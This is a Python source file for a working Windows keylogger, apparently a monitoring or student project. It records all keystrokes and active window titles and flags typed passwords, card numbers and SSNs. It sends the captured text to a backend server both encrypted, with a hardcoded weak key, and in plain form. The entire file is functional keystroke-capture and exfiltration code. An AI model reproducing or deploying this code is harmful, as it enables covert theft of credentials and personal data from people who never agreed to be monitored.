import os
import base64
import time
import threading
import requests
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import platform
import hashlib
import json
import ctypes
import ctypes.wintypes
#CONFIGURATION 
CONFIG = {
    "BACKEND_URL": "http://localhost:4000/api/keylogger/data",
    "USER_ID": "67fa6a24415733da21dfde32",  # MongoDB ObjectId
    "ENCRYPTION_KEY": b"VamshiBurgulaAdmin",  # Raw bytes
    "BUFFER_FLUSH_INTERVAL": 10,  # seconds
    "MAX_BUFFER_SIZE": 300,       # characters
    "TRUSTED_SITES": [
        "https://google.com", "https://stackoverflow.com", "https://github.com", "https://microsoft.com",
        "https://apple.com", "https://amazon.com", "https://youtube.com", "https://reddit.com",
        "https://wikipedia.org", "https://mozilla.org", "https://linkedin.com", "https://facebook.com",
        "https://edx.org", "https://medium.com", "https://gmail.com", "https://outlook.com"
    ],
    "UNSAFE_SITES": [
        "https://quora.com", "https://geeksforgeeks.org", "https://udemy.com", "https://hackerrank.com",
        "https://kaggle.com", "https://coursera.org", "https://1xbet.com", "https://bet365.com",
        "https://betway.com"
    ]
}

# INITIALIZATION
try:
    AES_KEY = CONFIG["ENCRYPTION_KEY"].ljust(32, b'\0')[:32]  # Padding the AES-256 key to 32-bytes 
    buffer = ""
    start_time = time.time()
    is_running = True
    last_window_title = None  # Track the active window
except Exception as e:
    print(f"Initialization error: {e}")
    exit(1)

# UTILITY FUNCTIONS 
def get_system_info():
    return {
        "platform": platform.platform(),
        "machine": platform.machine(),
        "python_version": platform.python_version()
    }

def create_request_signature(user_id, timestamp):
    return hashlib.sha256(f"{user_id}{timestamp}".encode()).hexdigest()

def get_active_window_title():
    try:
        user32 = ctypes.windll.user32
        h_wnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(h_wnd)
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(h_wnd, buffer, length + 1)
        return buffer.value
    except Exception:
        return "Unknown Window"

def is_trusted_website(title):
    return any(site.lower() in title.lower() for site in CONFIG["TRUSTED_SITES"])

def is_unsafe_website(title):
    return any(site.lower() in title.lower() for site in CONFIG["UNSAFE_SITES"])

# AES-256 ENCRYPTION 
def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + chr(pad_len) * pad_len

def safe_encrypt(data):
    try:
        raw = pad(data).encode()
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(raw)
        return base64.b64encode(iv + encrypted).decode('utf-8')
    except Exception as e:
        print(f"Encryption error: {e}")
        return data

#DATA PROCESSING 
def detect_sensitive_data(text):
    # Detect sensitive data and return as a list of flagged items
    sensitive_data = []
    text_lower = text.lower()
    if "password" in text_lower:
        sensitive_data.append("Password detected")
    if ("card" in text_lower or "cc" in text_lower) and any(c.isdigit() for c in text):
        sensitive_data.append("Credit card detected")
    if "ssn" in text_lower or "social security" in text_lower:
        sensitive_data.append("SSN detected")
    return sensitive_data

def detect_anomalies(text):
    anomalies = []
    if text.lower().count("password") >= 2:
        anomalies.append("Repeated password entries")
    if len(text) > CONFIG["MAX_BUFFER_SIZE"]:
        anomalies.append("Excessive keystrokes")
    elapsed = time.time() - start_time
    if elapsed > 0 and len(text)/elapsed > 30:
        anomalies.append("Unusually fast typing")
    current_hour = time.localtime().tm_hour
    if current_hour < 6 or current_hour > 23:
        anomalies.append("Activity at odd hours")
    return anomalies

# = SEND TO SERVER
def send_to_server(data, sensitive_data, anomalies):
    try:
        timestamp = int(time.time())
        window_title = get_active_window_title()

        # Prepare payload with sensitive data and anomalies
        payload = {
            "userId": CONFIG["USER_ID"],
            "keystrokes": safe_encrypt(data),
            "windowTitle": window_title,
            "isTrustedSite": is_trusted_website(window_title),
            "isUnsafeSite": is_unsafe_website(window_title),
            "sensitiveData": sensitive_data,  # Added sensitive data
            "anomalies": anomalies,  # Added anomalies
            "timestamp": timestamp,
            "systemInfo": get_system_info()
        }

        headers = {
            "X-Request-Signature": create_request_signature(CONFIG["USER_ID"], timestamp),
            "Content-Type": "application/json"
        }

        response = requests.post(
            CONFIG["BACKEND_URL"],
            data=json.dumps(payload),
            headers=headers,
            timeout=5
        )

        if response.status_code != 201:
            print(f"⚠️ Server error: {response.status_code} {response.text}")

    except Exception as e:
        print(f"Transmission error: {e}")

def send_decrypted_to_server(data):
    try:
        timestamp = int(time.time())
        window_title = get_active_window_title()

        payload = {
            "userId": CONFIG["USER_ID"],
            "keystrokes": data,
            "windowTitle": window_title,
            "timestamp": timestamp,
            "systemInfo": get_system_info()
        }

        response = requests.post(
            "http://localhost:4000/api/keylogger/save-decrypted",
            data=json.dumps(payload),
            headers={"Content-Type": "application/json"},
            timeout=5
        )

        if response.status_code != 201:
            print(f"⚠️ Decrypted save failed: {response.status_code} {response.text}")

    except Exception as e:
        print(f"Decrypted transmission error: {e}")

#  KEYSTROKE LISTENERS 
def on_press(key):
    global buffer, start_time, last_window_title
    try:
        if not is_running:
            return False
        if key == keyboard.Key.enter:
            buffer += "\n"
        elif hasattr(key, 'char') and key.char is not None:
            buffer += key.char

        if get_active_window_title() != last_window_title:
            last_window_title = get_active_window_title()
            # Add timestamp when the active window changes
            log_buffer(f"[WINDOW CHANGE] New active window: {last_window_title}")

    except Exception as e:
        print(f"Key processing error: {e}")

def on_release(key):
    global is_running
    if key == keyboard.Key.esc:
        is_running = False
        return False

def log_buffer(extra_info=""):
    global buffer
    if buffer.strip():
        try:
            entry = buffer.strip()

            # Detect sensitive data
            sensitive_data = detect_sensitive_data(entry)

            # Detect anomalies
            anomalies = detect_anomalies(entry)

            if anomalies:
                # Only flag sensitive data if there are anomalies
                if sensitive_data:
                    for item in sensitive_data:
                        print(f"⚠️ Sensitive Data Detected: {item}")
            
            # Send encrypted keystrokes and anomalies to the server
            send_to_server(entry, sensitive_data, anomalies)
            send_decrypted_to_server(entry)
        finally:
            buffer = ""  # Flush the buffer after processing

                            #MAIN EXECUTION 
if __name__ == "__main__":
    try:
        def buffer_flusher():
            while is_running:
                time.sleep(CONFIG["BUFFER_FLUSH_INTERVAL"])
                if buffer:
                    log_buffer()

        threading.Thread(target=buffer_flusher, daemon=True).start()

        print(" Keylogger active... Press ESC to stop.")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    except KeyboardInterrupt:
        print("\nShutting down gracefully...")
    finally:
        if buffer:
            log_buffer("[SHUTDOWN]")